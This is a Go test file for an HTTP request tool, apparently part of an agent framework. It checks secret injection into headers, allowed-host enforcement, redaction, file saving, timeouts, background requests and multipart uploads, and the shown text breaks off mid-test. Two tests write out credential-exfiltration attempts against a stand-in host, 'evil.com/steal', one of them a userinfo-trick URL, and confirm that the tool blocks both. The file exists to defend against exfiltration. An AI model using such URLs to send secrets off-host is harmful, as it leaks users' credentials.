package tools

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"mime"
	"mime/multipart"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"foci/internal/secrets"
)

func writeTestSecrets(t *testing.T, content string) *secrets.Store {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "secrets.toml")
	os.WriteFile(path, []byte(content), 0600)
	s, err := secrets.Load(path)
	if err != nil {
		t.Fatalf("load test secrets: %v", err)
	}
	return s
}

func TestHTTPRequestBasicGET(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"status":"ok","method":"%s"}`, r.Method)
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/test",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result.Text,"HTTP 200") {
		t.Errorf("expected HTTP 200 in result: %s", result.Text)
	}
	if !strings.Contains(result.Text,`"status":"ok"`) {
		t.Errorf("expected response body in result: %s", result.Text)
	}
	if !strings.Contains(result.Text,`"method":"GET"`) {
		t.Errorf("expected GET method in result: %s", result.Text)
	}
}

func TestHTTPRequestWithSecretHeaders(t *testing.T) {
	var receivedAuth string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedAuth = r.Header.Get("Authorization")
		fmt.Fprint(w, `{"status":"authenticated"}`)
	}))
	defer srv.Close()

	// Parse the test server host (e.g. "127.0.0.1")
	store := writeTestSecrets(t, fmt.Sprintf(`
[custom]
api_key = "sk-secret-123"
allowed_hosts = ["%s"]
`, srv.Listener.Addr().(*net.TCPAddr).IP.String()))

	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/api",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:custom.api_key}}",
		},
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result.Text,"HTTP 200") {
		t.Errorf("expected HTTP 200: %s", result.Text)
	}
	// Verify the secret was resolved server-side (actual value sent in header)
	if receivedAuth != "Bearer sk-secret-123" {
		t.Errorf("server received auth = %q, want 'Bearer sk-secret-123'", receivedAuth)
	}
}

func TestHTTPRequestBlockedHost(t *testing.T) {
	store := writeTestSecrets(t, `
[custom]
api_key = "sk-secret-123"
allowed_hosts = ["api.allowed.com"]
`)

	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": "https://evil.com/steal",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:custom.api_key}}",
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for blocked host")
	}
	if !strings.Contains(err.Error(), "not in allowed_hosts") {
		t.Errorf("error should mention allowed_hosts: %v", err)
	}
}

func TestHTTPRequestUserinfoAttack(t *testing.T) {
	store := writeTestSecrets(t, `
[custom]
api_key = "sk-secret-123"
allowed_hosts = ["api.example.com"]
`)

	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": "https://api.example.com@evil.com/steal",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:custom.api_key}}",
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for userinfo attack URL")
	}
	if !strings.Contains(err.Error(), "evil.com") {
		t.Errorf("error should mention evil.com: %v", err)
	}
}

func TestHTTPRequestNoAllowedHosts(t *testing.T) {
	store := writeTestSecrets(t, `
[legacy]
token = "sk-legacy-token"
`)

	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": "https://api.example.com/data",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:legacy.token}}",
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error for secret without allowed_hosts")
	}
	if !strings.Contains(err.Error(), "no allowed_hosts") {
		t.Errorf("error should mention no allowed_hosts: %v", err)
	}
}

func TestHTTPRequestNoSecretsNoRestriction(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "public data")
	}))
	defer srv.Close()

	// nil store — no secrets at all
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/public",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result.Text,"public data") {
		t.Errorf("expected response body: %s", result.Text)
	}
}

func TestHTTPRequestRedactResponse(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Echo back the Authorization header (simulating an API that leaks tokens)
		fmt.Fprintf(w, "your token is: %s", r.Header.Get("Authorization"))
	}))
	defer srv.Close()

	store := writeTestSecrets(t, fmt.Sprintf(`
[custom]
api_key = "sk-supersecret-should-be-redacted"
allowed_hosts = ["%s"]
`, srv.Listener.Addr().(*net.TCPAddr).IP.String()))

	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/echo",
		"headers": map[string]string{
			"Authorization": "Bearer {{secret:custom.api_key}}",
		},
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if strings.Contains(result.Text,"sk-supersecret-should-be-redacted") {
		t.Error("secret value should be redacted from response")
	}
	if !strings.Contains(result.Text,"[REDACTED]") {
		t.Error("expected [REDACTED] placeholder in response")
	}
}

func TestHTTPRequestQueryParams(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "q=%s&page=%s", r.URL.Query().Get("q"), r.URL.Query().Get("page"))
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/search",
		"query": map[string]string{
			"q":    "test query",
			"page": "2",
		},
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result.Text,"q=test query") {
		t.Errorf("expected query param q: %s", result.Text)
	}
	if !strings.Contains(result.Text,"page=2") {
		t.Errorf("expected query param page: %s", result.Text)
	}
}

func TestHTTPRequestMultipleSecretsAllChecked(t *testing.T) {
	store := writeTestSecrets(t, `
[apiA]
key = "key-a"
allowed_hosts = ["api.example.com"]

[apiB]
key = "key-b"
allowed_hosts = ["other.example.com"]
`)

	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": "https://api.example.com/data",
		"headers": map[string]string{
			"X-Api-Key-A": "{{secret:apiA.key}}",
			"X-Api-Key-B": "{{secret:apiB.key}}",
		},
	})

	// apiB.key allows other.example.com, not api.example.com — should fail
	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error when one secret doesn't allow the target host")
	}
	if !strings.Contains(err.Error(), "apiB.key") {
		t.Errorf("error should mention the failing secret: %v", err)
	}
}

func TestHTTPRequestSaveToText(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"result":"hello world"}`)
	}))
	defer srv.Close()

	savePath := filepath.Join(t.TempDir(), "output.json")
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":     srv.URL + "/api",
		"save_to": savePath,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	// Result should have status and path but not the body
	if !strings.Contains(result.Text,"HTTP 200") {
		t.Errorf("expected HTTP 200: %s", result.Text)
	}
	if !strings.Contains(result.Text,savePath) {
		t.Errorf("expected save path in result: %s", result.Text)
	}
	if strings.Contains(result.Text,"hello world") {
		t.Error("body should not be in result when save_to is used")
	}

	// File should contain the response body
	data, err := os.ReadFile(savePath)
	if err != nil {
		t.Fatalf("read saved file: %v", err)
	}
	if string(data) != `{"result":"hello world"}` {
		t.Errorf("saved content = %q", string(data))
	}
}

func TestHTTPRequestSaveToParentDirs(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "data")
	}))
	defer srv.Close()

	savePath := filepath.Join(t.TempDir(), "sub", "dir", "output.txt")
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":     srv.URL,
		"save_to": savePath,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	data, err := os.ReadFile(savePath)
	if err != nil {
		t.Fatalf("read saved file: %v", err)
	}
	if string(data) != "data" {
		t.Errorf("saved content = %q", string(data))
	}
}

func TestHTTPRequestBinaryAutoSave(t *testing.T) {
	pngData := []byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x1a, 0x0a}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "image/png")
		w.Write(pngData)
	}))
	defer srv.Close()

	tmpDir := t.TempDir()
	tool := NewHTTPRequestTool(nil, nil, tmpDir, 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL + "/image.png",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result.Text,"Saved") {
		t.Errorf("expected Saved in result: %s", result.Text)
	}
	if !strings.Contains(result.Text,".png") {
		t.Errorf("expected .png extension in result: %s", result.Text)
	}

	// Extract the saved path from result
	for _, line := range strings.Split(result.Text, "\n") {
		if strings.HasPrefix(line, "Saved") {
			parts := strings.Fields(line)
			savedPath := parts[len(parts)-1]
			data, err := os.ReadFile(savedPath)
			if err != nil {
				t.Fatalf("read auto-saved file: %v", err)
			}
			if len(data) != len(pngData) {
				t.Errorf("saved %d bytes, want %d", len(data), len(pngData))
			}
			return
		}
	}
	t.Error("could not find Saved line in result")
}

func TestHTTPRequestTextNotAutoSaved(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"status":"ok"}`)
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	// Text responses should be returned inline, not saved
	if strings.Contains(result.Text,"Saved") {
		t.Errorf("text response should not be auto-saved: %s", result.Text)
	}
	if !strings.Contains(result.Text,`"status":"ok"`) {
		t.Errorf("expected body in result: %s", result.Text)
	}
}

func TestHTTPRequestSaveFromJSONPath(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"data":[{"url":"extracted-value"}]}`)
	}))
	defer srv.Close()

	savePath := filepath.Join(t.TempDir(), "output.txt")
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":                 srv.URL,
		"save_to":             savePath,
		"save_from_json_path": "data.0.url",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result.Text,"Saved") {
		t.Errorf("expected Saved in result: %s", result.Text)
	}

	data, err := os.ReadFile(savePath)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if string(data) != "extracted-value" {
		t.Errorf("saved = %q, want %q", string(data), "extracted-value")
	}
}

func TestHTTPRequestSaveFromJSONPathDataURI(t *testing.T) {
	// Simulate an image generation API returning base64 data URI
	pngBytes := []byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a}
	b64 := base64.StdEncoding.EncodeToString(pngBytes)
	dataURI := "data:image/png;base64," + b64

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		resp, _ := json.Marshal(map[string]interface{}{
			"images": []map[string]interface{}{
				{"url": dataURI},
			},
		})
		w.Write(resp)
	}))
	defer srv.Close()

	savePath := filepath.Join(t.TempDir(), "image.png")
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":                 srv.URL,
		"save_to":             savePath,
		"save_from_json_path": "images.0.url",
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	if !strings.Contains(result.Text,"Saved") {
		t.Errorf("expected Saved in result: %s", result.Text)
	}

	data, err := os.ReadFile(savePath)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if len(data) != len(pngBytes) {
		t.Errorf("saved %d bytes, want %d", len(data), len(pngBytes))
	}
	// Verify actual bytes match
	for i, b := range data {
		if b != pngBytes[i] {
			t.Errorf("byte %d: got %02x, want %02x", i, b, pngBytes[i])
			break
		}
	}
}

func TestHTTPRequestSaveFromJSONPathRequiresSaveTo(t *testing.T) {
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":                 "http://example.com",
		"save_from_json_path": "data.0.url",
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected error when save_from_json_path set without save_to")
	}
	if !strings.Contains(err.Error(), "requires save_to") {
		t.Errorf("error = %v", err)
	}
}

func TestIsBinaryContentType(t *testing.T) {
	binary := []string{
		"image/png", "image/jpeg", "audio/mpeg", "video/mp4",
		"application/octet-stream", "application/pdf", "application/zip",
		"image/png; charset=utf-8",
	}
	for _, ct := range binary {
		if !isBinaryContentType(ct) {
			t.Errorf("isBinaryContentType(%q) = false, want true", ct)
		}
	}

	text := []string{
		"text/html", "text/plain", "application/json", "application/xml",
		"application/json; charset=utf-8", "application/ld+json",
		"application/vnd.api+json", "application/atom+xml", "",
	}
	for _, ct := range text {
		if isBinaryContentType(ct) {
			t.Errorf("isBinaryContentType(%q) = true, want false", ct)
		}
	}
}

func TestExtractJSONPath(t *testing.T) {
	data := []byte(`{"data":[{"url":"hello"},{"url":"world"}],"name":"test"}`)

	tests := []struct {
		path string
		want string
	}{
		{"name", "test"},
		{"data.0.url", "hello"},
		{"data.1.url", "world"},
	}
	for _, tt := range tests {
		got, err := extractJSONPath(data, tt.path)
		if err != nil {
			t.Errorf("extractJSONPath(%q): %v", tt.path, err)
			continue
		}
		if got != tt.want {
			t.Errorf("extractJSONPath(%q) = %q, want %q", tt.path, got, tt.want)
		}
	}

	// Error cases
	_, err := extractJSONPath(data, "missing")
	if err == nil {
		t.Error("expected error for missing key")
	}
	_, err = extractJSONPath(data, "data.99")
	if err == nil {
		t.Error("expected error for out of range index")
	}
}

func TestDecodeDataURI(t *testing.T) {
	// Valid base64 data URI
	raw := []byte{0x89, 0x50, 0x4e, 0x47}
	b64 := base64.StdEncoding.EncodeToString(raw)
	decoded, err := decodeDataURI("data:image/png;base64," + b64)
	if err != nil {
		t.Fatalf("decodeDataURI: %v", err)
	}
	if len(decoded) != len(raw) {
		t.Errorf("decoded %d bytes, want %d", len(decoded), len(raw))
	}

	// Not a data URI
	_, err = decodeDataURI("https://example.com")
	if err == nil {
		t.Error("expected error for non-data URI")
	}

	// Malformed (no comma)
	_, err = decodeDataURI("data:image/png;base64")
	if err == nil {
		t.Error("expected error for malformed data URI")
	}
}

func TestHTTPRequestCustomTimeout(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "ok")
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":     srv.URL,
		"timeout": 60,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !strings.Contains(result.Text,"ok") {
		t.Errorf("expected ok in result: %s", result.Text)
	}
}

func TestHTTPRequestTimeoutCap(t *testing.T) {
	t.Parallel()
	// A slow server that takes 1.5 seconds
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(1500 * time.Millisecond)
		fmt.Fprint(w, "slow")
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)

	// Request with 1-second timeout should fail
	params, _ := json.Marshal(map[string]interface{}{
		"url":     srv.URL,
		"timeout": 1,
	})

	_, err := tool.Execute(context.Background(), params)
	if err == nil {
		t.Fatal("expected timeout error")
	}
	if !strings.Contains(err.Error(), "deadline exceeded") && !strings.Contains(err.Error(), "context") {
		t.Errorf("expected timeout error, got: %v", err)
	}
}

func TestHTTPRequestSaveToLargeBody(t *testing.T) {
	// 2MB response — exceeds 1MB inline limit but within 10MB save_to limit
	bigBody := strings.Repeat("x", 2*1024*1024)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/octet-stream")
		fmt.Fprint(w, bigBody)
	}))
	defer srv.Close()

	savePath := filepath.Join(t.TempDir(), "big.bin")
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":     srv.URL,
		"save_to": savePath,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	data, err := os.ReadFile(savePath)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if len(data) != 2*1024*1024 {
		t.Errorf("saved %d bytes, want %d", len(data), 2*1024*1024)
	}
	if !strings.Contains(result.Text,"2097152") {
		t.Errorf("result should mention byte count: %s", result.Text)
	}
}

func TestHTTPRequestMaxResponseBytesOverride(t *testing.T) {
	// 500KB response, override limit to 256KB — should truncate
	bigBody := strings.Repeat("A", 500*1024)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		fmt.Fprint(w, bigBody)
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":                srv.URL,
		"max_response_bytes": 256 * 1024,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	// Body in result should be at most 256KB (plus headers/truncation text)
	if len(result.Text) > 300*1024 {
		t.Errorf("result too large: %d bytes", len(result.Text))
	}
}

func TestHTTPRequestMaxResponseBytesLargeOverride(t *testing.T) {
	// 3MB response with save_to, override limit to 5MB
	bigBody := strings.Repeat("B", 3*1024*1024)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/octet-stream")
		fmt.Fprint(w, bigBody)
	}))
	defer srv.Close()

	savePath := filepath.Join(t.TempDir(), "big.bin")
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":                srv.URL,
		"save_to":            savePath,
		"max_response_bytes": 5 * 1024 * 1024,
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	data, err := os.ReadFile(savePath)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if len(data) != 3*1024*1024 {
		t.Errorf("saved %d bytes, want %d", len(data), 3*1024*1024)
	}
}

func TestHTTPRequestAutoBackgroundFast(t *testing.T) {
	// A fast request should complete before the threshold — no notification
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "fast response")
	}))
	defer srv.Close()

	var called bool
	tool := NewHTTPRequestTool(nil, nil, "", 5, 50*1024*1024, NewAsyncNotifier(func(sk, msg string, replyTo string) {
		called = true
	}))

	params, _ := json.Marshal(map[string]interface{}{
		"url": srv.URL,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !strings.Contains(result.Text,"fast response") {
		t.Errorf("result = %q, want 'fast response'", result.Text)
	}
	if called {
		t.Error("notifier should not be called for fast requests")
	}
}

func TestHTTPRequestAutoBackgroundSlow(t *testing.T) {
	t.Parallel()
	// A slow request should auto-background after 1 second
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(1500 * time.Millisecond)
		fmt.Fprint(w, "slow response")
	}))
	defer srv.Close()

	completeCh := make(chan string, 1)
	tool := NewHTTPRequestTool(nil, nil, "", 1, 50*1024*1024, NewAsyncNotifier(func(sk, msg string, replyTo string) {
		completeCh <- msg
	}))

	params, _ := json.Marshal(map[string]interface{}{
		"url":     srv.URL,
		"timeout": 10,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	// Should get the auto-background message
	if !strings.Contains(result.Text,"still running") {
		t.Errorf("expected auto-background message, got %q", result.Text)
	}

	// Wait for the request to complete
	select {
	case completed := <-completeCh:
		if !strings.Contains(completed, "slow response") {
			t.Errorf("expected 'slow response' in completed message, got %q", completed)
		}
		if !strings.Contains(completed, "[HTTP RESULT]") {
			t.Errorf("expected [HTTP RESULT] prefix, got %q", completed)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for auto-backgrounded request")
	}
}

func TestHTTPRequestAutoBackgroundSessionKey(t *testing.T) {
	t.Parallel()
	// Verify the session key from context reaches the notifier callback
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(1500 * time.Millisecond)
		fmt.Fprint(w, "done")
	}))
	defer srv.Close()

	type result struct {
		sk, msg string
	}
	ch := make(chan result, 1)
	tool := NewHTTPRequestTool(nil, nil, "", 1, 50*1024*1024, NewAsyncNotifier(func(sk, msg string, replyTo string) {
		ch <- result{sk, msg}
	}))

	params, _ := json.Marshal(map[string]interface{}{
		"url":     srv.URL,
		"timeout": 10,
	})

	ctx := WithSessionKey(context.Background(), "agent:test:branch-42")
	out, err := tool.Execute(ctx, params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !strings.Contains(out.Text, "still running") {
		t.Fatalf("expected auto-background message, got %q", out.Text)
	}

	select {
	case r := <-ch:
		if r.sk != "agent:test:branch-42" {
			t.Errorf("session key = %q, want %q", r.sk, "agent:test:branch-42")
		}
		if r.msg == "" {
			t.Error("message should not be empty")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for notifier callback")
	}
}

func TestHTTPRequestExplicitBackground(t *testing.T) {
	// background=true should return immediately and deliver via notifier
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "bg response")
	}))
	defer srv.Close()

	completeCh := make(chan string, 1)
	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, NewAsyncNotifier(func(sk, msg string, replyTo string) {
		completeCh <- msg
	}))

	params, _ := json.Marshal(map[string]interface{}{
		"url":        srv.URL,
		"background": true,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}

	// Should get the background message
	if !strings.Contains(result.Text,"background") {
		t.Errorf("expected background message, got %q", result.Text)
	}

	// Wait for the request to complete
	select {
	case completed := <-completeCh:
		if !strings.Contains(completed, "bg response") {
			t.Errorf("expected 'bg response' in completed message, got %q", completed)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("timed out waiting for background request")
	}
}

func TestHTTPRequestBackgroundNoNotifier(t *testing.T) {
	// background=true but no notifier — should run synchronously
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "sync response")
	}))
	defer srv.Close()

	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)

	params, _ := json.Marshal(map[string]interface{}{
		"url":        srv.URL,
		"background": true,
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !strings.Contains(result.Text,"sync response") {
		t.Errorf("expected sync response, got %q", result.Text)
	}
}

// --- Multipart upload tests ---

// parseMultipartRequest is a test helper that extracts form fields and file parts
// from a multipart/form-data request.
func parseMultipartRequest(t *testing.T, r *http.Request) (fields map[string]string, files map[string]struct {
	Filename string
	Content  []byte
}) {
	t.Helper()
	ct := r.Header.Get("Content-Type")
	_, params, err := mime.ParseMediaType(ct)
	if err != nil {
		t.Fatalf("parse Content-Type %q: %v", ct, err)
	}
	mr := multipart.NewReader(r.Body, params["boundary"])
	fields = make(map[string]string)
	files = make(map[string]struct {
		Filename string
		Content  []byte
	})
	for {
		part, err := mr.NextPart()
		if err == io.EOF {
			break
		}
		if err != nil {
			t.Fatalf("NextPart: %v", err)
		}
		data, _ := io.ReadAll(part)
		if part.FileName() != "" {
			files[part.FormName()] = struct {
				Filename string
				Content  []byte
			}{part.FileName(), data}
		} else {
			fields[part.FormName()] = string(data)
		}
	}
	return
}

func TestHTTPRequestMultipartSingleFile(t *testing.T) {
	var receivedFields map[string]string
	var receivedFiles map[string]struct {
		Filename string
		Content  []byte
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedFields, receivedFiles = parseMultipartRequest(t, r)
		fmt.Fprint(w, `{"ok":true}`)
	}))
	defer srv.Close()

	// Create a temp file to upload
	tmpFile := filepath.Join(t.TempDir(), "test.txt")
	os.WriteFile(tmpFile, []byte("hello multipart"), 0644)

	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":    srv.URL,
		"method": "POST",
		"files": []map[string]string{
			{"field_name": "document", "file_path": tmpFile},
		},
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !strings.Contains(result.Text,"HTTP 200") {
		t.Errorf("expected HTTP 200: %s", result.Text)
	}
	if f, ok := receivedFiles["document"]; !ok {
		t.Error("expected file part 'document'")
	} else {
		if string(f.Content) != "hello multipart" {
			t.Errorf("file content = %q", string(f.Content))
		}
		if f.Filename != "test.txt" {
			t.Errorf("filename = %q, want test.txt", f.Filename)
		}
	}
	if len(receivedFields) != 0 {
		t.Errorf("expected no form fields, got %v", receivedFields)
	}
}

func TestHTTPRequestMultipartFileAndFormFields(t *testing.T) {
	var receivedFields map[string]string
	var receivedFiles map[string]struct {
		Filename string
		Content  []byte
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedFields, receivedFiles = parseMultipartRequest(t, r)
		fmt.Fprint(w, `{"ok":true}`)
	}))
	defer srv.Close()

	tmpFile := filepath.Join(t.TempDir(), "photo.jpg")
	os.WriteFile(tmpFile, []byte{0xFF, 0xD8, 0xFF}, 0644)

	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":    srv.URL,
		"method": "POST",
		"files": []map[string]string{
			{"field_name": "photo", "file_path": tmpFile},
		},
		"form_fields": map[string]string{
			"chat_id": "12345",
			"caption": "a nice photo",
		},
	})

	result, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !strings.Contains(result.Text,"HTTP 200") {
		t.Errorf("expected HTTP 200: %s", result.Text)
	}
	if _, ok := receivedFiles["photo"]; !ok {
		t.Error("expected file part 'photo'")
	}
	if receivedFields["chat_id"] != "12345" {
		t.Errorf("chat_id = %q", receivedFields["chat_id"])
	}
	if receivedFields["caption"] != "a nice photo" {
		t.Errorf("caption = %q", receivedFields["caption"])
	}
}

func TestHTTPRequestMultipartMultipleFiles(t *testing.T) {
	var receivedFiles map[string]struct {
		Filename string
		Content  []byte
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, receivedFiles = parseMultipartRequest(t, r)
		fmt.Fprint(w, `{"ok":true}`)
	}))
	defer srv.Close()

	dir := t.TempDir()
	file1 := filepath.Join(dir, "a.txt")
	file2 := filepath.Join(dir, "b.txt")
	os.WriteFile(file1, []byte("file-a"), 0644)
	os.WriteFile(file2, []byte("file-b"), 0644)

	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
	params, _ := json.Marshal(map[string]interface{}{
		"url":    srv.URL,
		"method": "POST",
		"files": []map[string]string{
			{"field_name": "file1", "file_path": file1},
			{"field_name": "file2", "file_path": file2},
		},
	})

	_, err := tool.Execute(context.Background(), params)
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if len(receivedFiles) != 2 {
